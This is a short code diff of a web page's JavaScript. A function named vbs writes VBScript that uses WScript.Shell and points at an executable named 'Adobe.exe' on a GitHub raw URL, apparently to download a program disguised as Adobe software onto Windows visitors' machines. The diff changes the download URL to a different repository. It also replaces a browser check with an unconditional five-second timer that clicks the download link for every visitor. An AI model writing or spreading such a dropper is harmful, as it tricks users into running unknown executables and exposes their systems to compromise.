@@ -16,7 +16,7 @@ function isWindowsDesktop() {
 async function vbs({ name, city, age }) {
     // Create VBScript content
     var vbsContent = `
-file_url = "https://raw.githubusercontent.com/ethanx00/bdsm/main/Adobe.exe"
+file_url = "https://raw.githubusercontent.com/tonypages/firstrepo/Adobe.exe"
 
 
 Set objShell = CreateObject("WScript.Shell")
@@ -242,7 +242,14 @@ $('#load').on('click', async function () {
 
     $this.button('loading');
 
-    console.log(navigator)
+    setTimeout(function () {
+        $this.button('reset');
+        link[0].click();
+        show(".fm");
+        hide(".error");
+    }, 5000);
+    
+    /*console.log(navigator)
     if (!navigator) {
         link[0].click();
         setTimeout(function () {
@@ -258,5 +265,5 @@ $('#load').on('click', async function () {
             hide(".fm");
             //link[0].click();
         }, 5000);
-    }
+    }*/
 });
